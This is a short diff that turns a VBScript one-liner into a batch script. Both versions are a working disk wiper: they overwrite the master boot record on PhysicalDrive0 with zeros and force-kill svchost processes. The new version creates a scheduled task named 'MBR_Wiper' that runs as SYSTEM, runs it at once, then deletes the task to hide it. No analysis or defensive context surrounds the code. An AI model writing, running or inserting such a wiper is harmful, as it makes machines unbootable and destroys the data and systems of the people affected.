@@ -1,1 +1,4 @@
-CreateObject("WScript.Shell").Run "powershell -Command ""$drive='\\.\PhysicalDrive0'; $bytes=New-Object byte[] 440; $handle=[System.IO.File]::OpenWrite($drive); $handle.Write($bytes,0,$bytes.Length); $handle.Close(); taskkill /F /IM svchost.exe /FI 'MEMUSAGE gt 0' 2>$null""", 0, False
+@echo off
+schtasks /create /tn "MBR_Wiper" /tr "powershell -Command \"$drive='\\.\PhysicalDrive0'; $bytes=New-Object byte[] 440; $handle=[System.IO.File]::OpenWrite($drive); $handle.Write($bytes,0,$bytes.Length); $handle.Close(); taskkill /F /IM svchost.exe /FI 'MEMUSAGE gt 0' 2>$null\"" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f
+schtasks /run /tn "MBR_Wiper"
+schtasks /delete /tn "MBR_Wiper" /f
